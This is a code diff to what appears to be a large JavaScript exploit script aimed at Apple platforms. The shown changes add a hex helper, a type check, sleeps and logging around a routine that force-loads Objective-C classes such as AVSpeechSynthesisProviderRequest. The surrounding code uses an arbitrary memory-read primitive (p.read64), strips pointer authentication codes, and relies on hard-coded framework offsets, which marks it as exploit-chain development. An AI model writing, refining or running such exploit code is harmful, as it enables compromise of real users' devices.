@@ -100,6 +100,9 @@ BigInt.prototype.asInt32s = function() {
 function offsetHex(offset) {
     return '0x' + offset.toString(16);
 }
+function valueHex(value) {
+    return typeof value === 'bigint' ? value.hex() : String(value);
+}
 function stripPointerForRead(value, label, log) {
     const stripped = value.noPAC();
     if (stripped !== value)
@@ -18645,7 +18648,10 @@ async function main() {
       });
       print(`loadObjcClass: helper close done index=${index}`);
     }
-    print(`loadObjcClass: begin cls=${cls.hex()}`);
+    print(`loadObjcClass: begin cls=${valueHex(cls)}`);
+    sleep(10);
+    if (typeof cls !== 'bigint')
+      throw new Error(`loadObjcClass: invalid cls=${String(cls)}`);
     const helperIndex = p.class_load_worker_next || 0;
     const helper = p.class_load_workers && p.class_load_workers[helperIndex];
     if (helper) {
@@ -18841,8 +18847,10 @@ async function main() {
             print(`preload class write done i=${i}`);
             sleep(10);
           }
-          print('Load TextToSpeech');
-          await loadObjcClass(offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest);
+          const providerRequestClass = offsets.AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest;
+          print(`Load TextToSpeech target=${valueHex(providerRequestClass)}`);
+          sleep(10);
+          await loadObjcClass(providerRequestClass);
           print('TextToSpeech Loaded');
           const NSBundleTables = p.read64(offsets.Foundation__NSBundleTables_bundleTables_value);
           print(`NSBundleTables: ${NSBundleTables.hex()}`);
